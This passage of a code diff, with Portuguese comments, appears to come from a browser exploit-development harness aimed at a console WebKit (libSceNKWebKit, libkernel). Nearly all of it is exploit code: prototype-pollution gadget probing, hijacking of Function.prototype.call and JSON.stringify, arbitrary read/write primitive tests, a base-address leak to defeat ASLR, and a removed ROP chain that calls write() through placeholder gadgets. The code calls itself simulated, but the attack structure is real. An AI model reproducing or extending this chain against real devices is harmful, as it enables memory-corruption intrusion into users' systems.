-                        gadgetCheck: (fn, v, item) => { try { fn.call(null); return false; } catch (e) { log(`-> INFO: Erro ao usar Function.call poluído detectado (${e.name}). Considerando gadget ATIVO.`, 'info', FNAME); ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; log(`-> GADGET? Function.call: Quebrado! Potencial hijack (erro genérico).`, 'critical', FNAME); return `Function.call quebrou! ${e.message}`; } }, createTarget: () => function(){} },
-                     { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v, item) => { try{function f(){}; f.apply(); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, ]; const testValue = "PP_Adv_Polluted_" + Date.now(); let successCount = 0; let gadgetCount = 0; let gadgetMessages = []; for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue, item); } catch(e){} if (gadgetMsg) { if (!gadgetMsg.startsWith('Function.call')) { log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++;} /* else { Log já acontece dentro do check } */ if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); } log(`--- Teste Concluído (${successCount} OK, ${gadgetCount + (ppGadgetsBroken['Function.call']?1:0)} gadgets encontrados) ---`, 'test', FNAME); if (gadgetMessages.length > 0 || ppGadgetsBroken['Function.call']) { log(`Gadgets detectados: ${gadgetMessages.join('; ')}${ppGadgetsBroken['Function.call'] ? (gadgetMessages.length>0?'; ':'')+'call: Function.call quebrado!' : ''}`, 'critical', FNAME); } await PAUSE(); };
-
-            // Teste 5: Tentativa de Chamar Libc via Gadget PP (Opção A)
-            const testPPGadgetCallLibc = async () => { /* ... (código inalterado, pode ou não pular) ... */ const FNAME = 'testPPGadgetCallLibc'; log("--- Iniciando Teste: Tentativa de chamar puts via Hijack (Function.call) ---", 'test', FNAME); if (!ppGadgetsBroken['Function.call']) { log("Gadget Function.call não quebrado/detectado no teste anterior. Pulando.", 'good', FNAME); log("--- Teste Concluído (Pulado) ---", 'test', FNAME); return; } log(`GOOD: Gadget Function.call detectado como ATIVO! Prosseguindo com a tentativa de chamada (simulada) para puts...`, 'good', FNAME); const targetPutsAddress = BigInt(libcBaseAddress) + BigInt(putsOffset); log(`Endereço base libc: ${toHex(libcBaseAddress, 64)}`, 'info', FNAME); log(`Offset puts (PLACEHOLDER): ${toHex(putsOffset)}`, 'warn', FNAME); log(`Endereço puts calculado: ${toHex(targetPutsAddress, 64)}`, 'good', FNAME); const originalCall = Function.prototype.call; let hijackExecutedCount = 0; let attemptedNativeCall = false; try { const hijackedCallFunction = function(thisArg, ...args) { hijackExecutedCount++; if (hijackExecutedCount === 1 && hijackedCallFunction.calledExplicitly) { log(`===> Function.call SEQUESTRADO! Tentando chamar puts em ${toHex(targetPutsAddress, 64)} <===`, 'vuln', FNAME); attemptedNativeCall = true; try { log(`[SIMULAÇÃO] Chamaria a função no endereço ${toHex(targetPutsAddress, 64)} com argumentos apropriados.`, 'warn', FNAME); log(` ---> *** ALERTA: Tentativa (simulada) de chamada nativa via PP Gadget + Info Leak! ***`, 'escalation', FNAME); log(` // TODO: Implementar lógica real de hijack e chamada aqui.`, 'warn', FNAME); } catch(e) { log(` -> Erro ao tentar simular chamada nativa: ${e.message}`, 'error', FNAME); } return "Simulated Native Call Result"; } else { try { return originalCall.apply(this, [thisArg, ...args]); } catch(e) { if (hijackExecutedCount <= 5) log(` -> Erro ao chamar originalCall.apply (Chamada #${hijackExecutedCount}): ${e.message}`, 'warn', FNAME); return undefined; } } }; hijackedCallFunction.calledExplicitly = false; log("Poluindo Function.prototype.call com função controlada...", 'info', FNAME); Function.prototype.call = hijackedCallFunction; log("Chamando (()=>{}).call(null) para ativar hijack e simular chamada...", 'info', FNAME); try { const dummyFunc = () => {}; hijackedCallFunction.calledExplicitly = true; const result = dummyFunc.call(null); log(` -> Chamada explícita para call concluída. Retorno: ${result}`, 'good', FNAME); } catch (e) { log(` -> Erro ao chamar call sequestrado explicitamente: ${e.message}`, 'error', FNAME); } await PAUSE(MEDIUM_PAUSE); } catch (e) { log(`Erro fatal durante Teste: ${e.message}`, 'error', FNAME); console.error(e); } finally { if (Function.prototype.call !== originalCall) { Function.prototype.call = originalCall; log("Function.prototype.call restaurado.", 'good', 'Cleanup'); } } log(`--- Teste Concluído (Hijack Executado ${hijackExecutedCount} vezes, Tentativa Chamada Nativa: ${attemptedNativeCall}) ---`, 'test', FNAME); };
-
-            // Teste 6: Interação Hijack + Leak (Inalterado)
-            const testPPJsonHijackInteraction = async () => { /* ... (código inalterado) ... */ const FNAME = 'testPPJsonHijackInteraction'; log("--- Iniciando Teste: PP Hijack (JSON.stringify) + OOB Interaction ---", 'test', FNAME); const orig = JSON.stringify; let okH = false; let okL = false; let okR = false; try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; let lHex = ""; if (l != null) { lHex = ` (H=${toHex(l.high)}, L=${toHex(l.low)})`; lStr = l.type; okL = true; log(` ---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME); } log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} } log(`--- Teste Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME); return okR && okL; };
-
-            // <<< MODIFICADO: Teste 7 agora chama 'write' via ROP (simulado) >>>
-            /*
-             * TESTE 7: Tentativa de Chamar 'write' via R/W Arbitrário + ROP (Simulado)
-             * Assume que testOOBWriteMetadata funcionou e arbitraryRWHelpers está disponível.
-             * USA ROP SIMULADO para chamar write(fd, buffer, length).
-             */
-            async function tryCallKernelNotifyViaRW() { // Mantendo nome antigo, mas lógica mudou
-                const FNAME = 'tryCallKernelNotifyViaRW';
-                log(`--- Iniciando Teste: Chamada 'write' para Notificação via R/W + ROP (Simulado) ---`, 'test', FNAME);
-
-                if (!arbitraryRWHelpers) {
-                    log("Helpers R/W Arbitrário não disponíveis. Pulando.", 'warn', FNAME);
-                    log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME);
-                    return;
+            try {
+                log(`Tentando escrever ${toHex(valueToWrite, 64)} em ${toHex(safeTestAddr, 64)} (dentro do buffer corrompido)...`, 'info', FNAME);
+                write64(safeTestAddr, valueToWrite);
+                log(`VULN: Escrita Arbitrária (Abs. Simulado) em ${toHex(safeTestAddr, 64)} realizada.`, 'vuln', FNAME);
+                await PAUSE(SHORT_PAUSE);
+                log(`Tentando ler de volta de ${toHex(safeTestAddr, 64)}...`, 'info', FNAME);
+                const readBackValue = read64(safeTestAddr);
+                if (readBackValue === valueToWrite) {
+                    log(`GOOD: Confirmação R/W Arbitrário (Abs. Simulado): Leu ${toHex(readBackValue, 64)} de volta! Primitivas R/W funcionais.`, 'good', FNAME);
+                    log(`---> *** ALERTA: Primitiva Arbitrary Read/Write (Absoluta Simulada) FUNCIONANDO! ***`, 'escalation', FNAME);
+                } else {
+                    log(`FALHA Confirmação R/W Arbitrário (Abs. Simulado): Leu ${toHex(readBackValue, 64)} != ${toHex(valueToWrite, 64)}`, 'warn', FNAME);
                 }
-                const { read64, write64 } = arbitraryRWHelpers;
-                log(`R/W Arbitrário (Absoluto Simulado) disponível! Base Buffer: ${toHex(corruptedMetadataBufferBaseAddr, 64)}`, 'info', FNAME);
+            } catch (eWriteSafe) {
+                log(`FALHA Teste R/W Arbitrário (Abs. Simulado): ${eWriteSafe.message}`, 'error', FNAME);
+            }
+            log("--- Teste Concluído ---", 'test', FNAME);
+            await PAUSE();
+        };
 
-                let notificationFD = -1n; // BigInt -1
-                let fdReadSuccess = false;
-                try {
-                    // Tentar ler o FD de DAT_00061630 (relativo a libkernel)
-                    log(`(Simulado) Lendo FD de ${toHex(notificationFD_GlobalAddress, 64)}...`, 'info', FNAME);
-                    notificationFD = read64(notificationFD_GlobalAddress);
-                    // Verificar se o FD é válido (não -1)
-                    if (notificationFD !== 0xFFFFFFFFFFFFFFFFn && notificationFD !== BigInt(-1)) {
-                        log(`LEAK: FD lido de ${toHex(notificationFD_GlobalAddress, 64)}: ${notificationFD.toString()} (${toHex(notificationFD, 64)})`, 'leak', FNAME);
-                        fdReadSuccess = true;
-                    } else {
-                        log(`WARN: FD lido de ${toHex(notificationFD_GlobalAddress, 64)} parece inválido (${toHex(notificationFD, 64)}). Tentativa pode falhar.`, 'warn', FNAME);
-                        notificationFD = 3n; // Usar um FD placeholder como fallback? (Perigoso)
-                        log(`WARN: Usando FD placeholder = ${notificationFD}.`, 'warn', FNAME);
-                        // fdReadSuccess permanece false se lemos -1
-                    }
-                } catch (e) {
-                    log(`Erro ao ler FD de ${toHex(notificationFD_GlobalAddress, 64)}: ${e.message}. Usando FD placeholder = 3.`, 'error', FNAME);
-                    notificationFD = 3n; // Usar FD placeholder em caso de erro na leitura
-                }
+        const testLeakNKWebKitBaseAddress = async () => {
+            const FNAME = 'testLeakNKWebKitBaseAddress';
+            log(`--- Iniciando Teste: Vazamento de Endereço Base da libSceNKWebKit via OOB Read (Simulado) ---`, 'test', FNAME);
+            foundNKWebKitBaseAddress = null; 
 
-                // --- Preparação Payload (Simulada com Placeholders) ---
-                const targetWriteAddress = BigInt(libcBaseAddress) + BigInt(writeOffset);
-                log(`Endereço alvo da função 'write': ${toHex(targetWriteAddress, 64)}`, 'info', FNAME);
+            if (!arbitraryRWHelpers) {
+                log("Helpers R/W Arbitrário (arbitraryRWHelpers) não disponíveis. Pulando leak.", 'warn', FNAME);
+                log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME);
+                return;
+            }
+            const { read64, write64 } = arbitraryRWHelpers;
 
-                // 1. Preparar string da mensagem
-                const fakeStringAddress = corruptedMetadataBufferBaseAddr + 3000n;
-                const notificationMessage = "POC Write! Funciona?";
-                const messageLength = BigInt(notificationMessage.length); // Tamanho da string
-                try {
-                    log(`(Simulado) Escrevendo string "${notificationMessage}" (len=${messageLength}) em ${toHex(fakeStringAddress, 64)}...`, 'info', FNAME);
-                    // Simulação de escrita da string (precisaria de write8/writeBytes real)
-                    // Exemplo escrevendo os primeiros 8 bytes como U64:
-                    let first8Bytes = 0n;
-                    for(let i=0; i<8 && i<notificationMessage.length; i++) {
-                        first8Bytes |= (BigInt(notificationMessage.charCodeAt(i)) << BigInt(i*8));
-                    }
-                    write64(fakeStringAddress, first8Bytes);
-                    // ... precisaria escrever o resto
-                    log(`-> (Simulado) String escrita.`, 'info', FNAME);
-                } catch (e) {
-                     log(`Erro ao simular escrita da string: ${e.message}`, 'error', FNAME);
-                     log(`--- Teste Concluído (Erro ao preparar args) ---`, 'test', FNAME);
+            // SIMULATED_OBJECT_ADDRESS_FOR_LEAK deve ser um endereço que nossos helpers R/W simulados consigam alcançar.
+            // Por exemplo, um offset a partir de corruptedMetadataBufferBaseAddr.
+            // Para garantir que esteja dentro dos limites do buffer corrompido na simulação:
+            const leakTargetAddressSim = corruptedMetadataBufferBaseAddr + 0x1000n; // Ex: 4KB dentro do buffer
+            log(`INFO (Sim Setup): Endereço alvo para o ponteiro a ser vazado: ${toHex(leakTargetAddressSim, 64)}`, 'info', FNAME);
+
+
+            try {
+                const pointerToLeakValue = EXPECTED_NKWEBIT_BASE_SIMULATED + KNOWN_NKWEBIT_INTERNAL_POINTER_OFFSET_SIMULATED;
+                log(`INFO (Sim Setup): Escrevendo ponteiro ${toHex(pointerToLeakValue, 64)} (que aponta para dentro da NKWebKit simulada) em ${toHex(leakTargetAddressSim, 64)}.`, 'info', FNAME);
+                write64(leakTargetAddressSim, pointerToLeakValue);
+
+                log(`INFO (Sim Exploit): Tentando ler de ${toHex(leakTargetAddressSim, 64)} usando read64 (simulando OOB Read em um objeto).`, 'info', FNAME);
+                const leakedPointer = read64(leakTargetAddressSim);
+                log(`LEAK: (Simulado) Ponteiro (ex: vtable) vazado: ${toHex(leakedPointer, 64)}`, 'leak', FNAME);
+
+                if (leakedPointer === 0n || leakedPointer === undefined) {
+                     log(`AVISO: Ponteiro vazado é NULO ou indefinido. O leak pode não ter sido configurado corretamente ou a leitura falhou.`, 'warn', FNAME);
+                     log(`--- Teste Concluído (Falha no Leak Simulado) ---`, 'test', FNAME);
                      return;
                 }
+                
+                const calculatedBase = leakedPointer - KNOWN_NKWEBIT_INTERNAL_POINTER_OFFSET_SIMULATED;
+                log(`GOOD: (Simulado) Endereço base da libSceNKWebKit CALCULADO: ${toHex(calculatedBase, 64)}`, 'good', FNAME);
+                foundNKWebKitBaseAddress = calculatedBase;
 
-                // 2. Construir ROP Chain para write(fd, buffer, length)
-                const fakeStackBase = corruptedMetadataBufferBaseAddr + 4000n;
-                let ropStackPtr = fakeStackBase;
-                const ropChain = [];
-                log(`(Simulado) Construindo ROP chain para write() em ${toHex(fakeStackBase, 64)}...`, 'info', FNAME);
-
-                // --- ROP Chain (!!! GADGETS SÃO PLACEHOLDERS !!!) ---
-                // Objetivo: write(RDI=fd, RSI=ptr_msg, RDX=len)
-
-                // Gadget para RDI (File Descriptor)
-                ropChain.push(BigInt(libcBaseAddress) + BigInt(ROP_POP_RDI_RET_OFFSET)); // pop rdi; ret
-                ropChain.push(notificationFD);                                          // Valor do FD (lido ou placeholder)
-
-                // Gadget para RSI (Ponteiro para Buffer)
-                ropChain.push(BigInt(libcBaseAddress) + BigInt(ROP_POP_RSI_RET_OFFSET)); // pop rsi; ret
-                ropChain.push(fakeStringAddress);                                       // Endereço da string
-
-                // Gadget para RDX (Tamanho)
-                ropChain.push(BigInt(libcBaseAddress) + BigInt(ROP_POP_RDX_RET_OFFSET)); // pop rdx; ret
-                ropChain.push(messageLength);                                           // Tamanho da string
-
-                // Endereço da função 'write'
-                ropChain.push(targetWriteAddress);
-
-                // (Opcional) Ponto de retorno ou próximo gadget após write
-                // ropChain.push(some_other_address_or_gadget);
-                // ---------------------------------------------------------
-
-                try {
-                     // Escrever a ROP chain na memória simulada
-                     for(const value of ropChain) {
-                         write64(ropStackPtr, value);
-                         log(` -> ROP: ${toHex(value, 64)} @ ${toHex(ropStackPtr, 64)}`, 'info', FNAME);
-                         ropStackPtr += 8n;
-                     }
-                     log(`-> (Simulado) ROP chain para write() escrita na memória.`, 'good', FNAME);
-
-                    // 3. Trigger ROP Chain (Simulado)
-                    log(`VULN: (SIMULADO) Trigger da ROP chain em ${toHex(fakeStackBase, 64)}!`, 'vuln', FNAME);
-                    log(`---> *** ALERTA: Tentativa de chamar write(${notificationFD}, ${toHex(fakeStringAddress, 64)}, ${messageLength}) via ROP (Simulado)! ***`, 'escalation', FNAME);
-                    if (fdReadSuccess) {
-                         log("INFO: Chamada simulada usou FD lido da memória.", 'info', FNAME);
-                    } else {
-                         log("WARN: Chamada simulada usou FD placeholder pois leitura falhou ou retornou -1.", 'warn', FNAME);
-                    }
-
-                } catch (e) {
-                    log(`Erro durante a construção/trigger ROP simulado: ${e.message}`, 'error', FNAME);
+                if (calculatedBase === EXPECTED_NKWEBIT_BASE_SIMULATED) {
+                    log(`SUCESSO DA SIMULAÇÃO: Base da libSceNKWebKit calculado (${toHex(calculatedBase,64)}) corresponde ao esperado!`, 'critical', FNAME);
+                    log(`---> *** ALERTA: Vazamento de Endereço Base da NKWebKit (SIMULADO) BEM SUCEDIDO! ***`, 'escalation', FNAME);
+                } else {
+                    log(`AVISO DA SIMULAÇÃO: Base calculada (${toHex(calculatedBase,64)}) NÃO corresponde ao esperado (${toHex(EXPECTED_NKWEBIT_BASE_SIMULATED,64)}). Verifique KNOWN_NKWEBIT_INTERNAL_POINTER_OFFSET_SIMULATED e a lógica.`, 'warn', FNAME);
                 }
 
-                log(`--- Teste Concluído (Simulação ROP para write) ---`, 'test', FNAME);
-                await PAUSE();
+            } catch (e) {
+                log(`ERRO durante o teste de vazamento da base da NKWebKit: ${e.message}`, 'error', FNAME);
+                console.error(e);
+            }
+            log(`--- Teste Concluído ---`, 'test', FNAME);
+            await PAUSE();
+        };
+
+        const testAdvancedPP = async () => { /* ... (código original do testAdvancedPP inalterado) ... */ 
+            const FNAME = 'testAdvancedPP'; log("--- Iniciando Teste: PP Avançado (Gadgets++) ---", 'test', FNAME); ppGadgetsBroken = {}; const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v, item) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v, item) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v, item) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].map(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].filter(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].forEach(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[1,2].join(); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] },
+            { name: 'call', proto: Function.prototype, protoName: 'Function', gadgetCheck: (fn, v, item) => { try { fn.call(null); return false; } catch (e) { log(`-> INFO: Erro ao usar Function.call poluído detectado (${e.name}). Considerando gadget ATIVO.`, 'info', FNAME); ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; log(`-> GADGET? Function.call: Quebrado! Potencial hijack (erro genérico).`, 'critical', FNAME); return `Function.call quebrou! ${e.message}`; } }, createTarget: () => function(){} },
+            { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v, item) => { try{function f(){}; f.apply(); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, ]; const testValue = "PP_Adv_Polluted_" + Date.now(); let successCount = 0; let gadgetCount = 0; let gadgetMessages = []; for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue, item); } catch(e){} if (gadgetMsg) { if (!gadgetMsg.startsWith('Function.call')) { log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++;}  if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); } log(`--- Teste Concluído (${successCount} OK, ${gadgetCount + (ppGadgetsBroken['Function.call']?1:0)} gadgets encontrados) ---`, 'test', FNAME); if (gadgetMessages.length > 0 || ppGadgetsBroken['Function.call']) { log(`Gadgets detectados: ${gadgetMessages.join('; ')}${ppGadgetsBroken['Function.call'] ? (gadgetMessages.length>0?'; ':'')+'call: Function.call quebrado!' : ''}`, 'critical', FNAME); } await PAUSE();
+        };
+        
+        const testPPGadgetCallLibc = async () => { /* ... (código original do testPPGadgetCallLibc inalterado, ele ainda usa libcBaseAddress e putsOffset para simular chamada à libc) ... */
+            const FNAME = 'testPPGadgetCallLibc'; log("--- Iniciando Teste: Tentativa de chamar puts (libc) via Hijack (Function.call) ---", 'test', FNAME); if (!ppGadgetsBroken['Function.call']) { log("Gadget Function.call não quebrado/detectado no teste anterior. Pulando.", 'good', FNAME); log("--- Teste Concluído (Pulado) ---", 'test', FNAME); return; } log(`GOOD: Gadget Function.call detectado como ATIVO! Prosseguindo com a tentativa de chamada (simulada) para puts...`, 'good', FNAME); const targetPutsAddress = BigInt(libcBaseAddress) + BigInt(putsOffset); log(`Endereço base libc: ${toHex(libcBaseAddress, 64)}`, 'info', FNAME); log(`Offset puts (PLACEHOLDER): ${toHex(putsOffset)}`, 'warn', FNAME); log(`Endereço puts calculado: ${toHex(targetPutsAddress, 64)}`, 'good', FNAME); const originalCall = Function.prototype.call; let hijackExecutedCount = 0; let attemptedNativeCall = false; try { const hijackedCallFunction = function(thisArg, ...args) { hijackExecutedCount++; if (hijackExecutedCount === 1 && hijackedCallFunction.calledExplicitly) { log(`===> Function.call SEQUESTRADO! Tentando chamar puts em ${toHex(targetPutsAddress, 64)} <===`, 'vuln', FNAME); attemptedNativeCall = true; try { log(`[SIMULAÇÃO] Chamaria a função no endereço ${toHex(targetPutsAddress, 64)} com argumentos apropriados.`, 'warn', FNAME); log(` ---> *** ALERTA: Tentativa (simulada) de chamada nativa via PP Gadget + Info Leak! ***`, 'escalation', FNAME); log(` // TODO: Implementar lógica real de hijack e chamada aqui.`, 'warn', FNAME); } catch(e) { log(` -> Erro ao tentar simular chamada nativa: ${e.message}`, 'error', FNAME); } return "Simulated Native Call Result"; } else { try { return originalCall.apply(this, [thisArg, ...args]); } catch(e) { if (hijackExecutedCount <= 5) log(` -> Erro ao chamar originalCall.apply (Chamada #${hijackExecutedCount}): ${e.message}`, 'warn', FNAME); return undefined; } } }; hijackedCallFunction.calledExplicitly = false; log("Poluindo Function.prototype.call com função controlada...", 'info', FNAME); Function.prototype.call = hijackedCallFunction; log("Chamando (()=>{}).call(null) para ativar hijack e simular chamada...", 'info', FNAME); try { const dummyFunc = () => {}; hijackedCallFunction.calledExplicitly = true; const result = dummyFunc.call(null); log(` -> Chamada explícita para call concluída. Retorno: ${result}`, 'good', FNAME); } catch (e) { log(` -> Erro ao chamar call sequestrado explicitamente: ${e.message}`, 'error', FNAME); } await PAUSE(MEDIUM_PAUSE); } catch (e) { log(`Erro fatal durante Teste: ${e.message}`, 'error', FNAME); console.error(e); } finally { if (Function.prototype.call !== originalCall) { Function.prototype.call = originalCall; log("Function.prototype.call restaurado.", 'good', 'Cleanup'); } } log(`--- Teste Concluído (Hijack Executado ${hijackExecutedCount} vezes, Tentativa Chamada Nativa: ${attemptedNativeCall}) ---`, 'test', 